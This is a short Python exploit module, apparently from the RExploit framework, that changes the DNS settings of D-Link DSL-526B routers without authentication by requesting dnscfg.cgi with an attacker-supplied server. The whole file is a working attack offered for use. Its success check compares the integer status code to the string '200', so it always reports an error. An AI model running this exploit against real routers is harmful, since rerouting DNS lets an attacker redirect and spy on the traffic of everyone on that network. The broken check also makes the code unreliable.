from requests import get

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="DSL-526B ADSL2+ Unauthenticated Remote DNS Change Exploit",
            category="csrf",
            authors={
                "Todor Donev": "Vulnerability discovery",
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "DSL-526B"
            ],
            date="18/02/2015",
            cwe="CWE-352: Cross-Site Request Forgery (CSRF)",
            description="Different D-Link Routers are vulnerable to DNS change. The vulnerability exist in the web interface, which is  accessible without authentication. ",
            references={
                "https://www.exploit-db.com/exploits/37241/": "ExploitDB"
            }
        )

    def default(self):
        data = {"dns": "8.8.8.8"}

        return data

    def run(self, data):
        DNS = data["dns"]

        if DNS:
            r = get("http://{0}/dnscfg.cgi?dnsSecondary={1}&dnsDynamic=0&dnsRefresh=1".format(self.getIP(), DNS))

            if r.status_code == "200":
                message = "DNS change successfully"
            else:
                message = "Error"

            return message
        else:
            return "Error"
